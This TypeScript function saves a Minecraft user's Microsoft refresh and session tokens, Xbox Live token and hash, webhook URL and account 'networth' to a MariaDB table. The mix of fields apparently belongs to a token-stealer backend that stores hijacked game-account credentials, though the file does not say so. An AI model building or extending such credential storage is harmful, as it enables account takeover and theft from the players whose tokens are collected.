import getConnection from "../mariadb";

export default async function saveToken(user_id:string, username:string, uuid:string, refresh_token:string, session_token:string, xbl_token:string, xbl_hash:string ,callback_url:string, networth:number) {
    let conn;
    try {
        conn = await getConnection();
        const rows = await conn.query('SELECT uuid FROM tokens WHERE uuid = ? AND user_id = ?', [uuid, user_id]);
        //if the user already has a webhook registered, update it
        if (rows.length > 0) {
            await conn.query('UPDATE tokens SET refresh_token = ?, session_token = ?, xbl_token = ?, xbl_hash = ?, callback_url = ?, networth = ? WHERE user_id = ? AND uuid = ?', [refresh_token, session_token, xbl_token, xbl_hash, callback_url, networth, user_id, uuid]);
        } else {
            //if the user doesn't have a webhook registered, insert it
            await conn.query('INSERT INTO tokens (user_id, refresh_token, session_token, xbl_token, xbl_hash,username, uuid, callback_url, networth) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', [user_id, refresh_token, session_token, xbl_token, xbl_hash, username, uuid, callback_url, networth]);
        }
        await conn.release();
        return true;
    } catch (err) {
        console.error(err);
        return false;
    }
}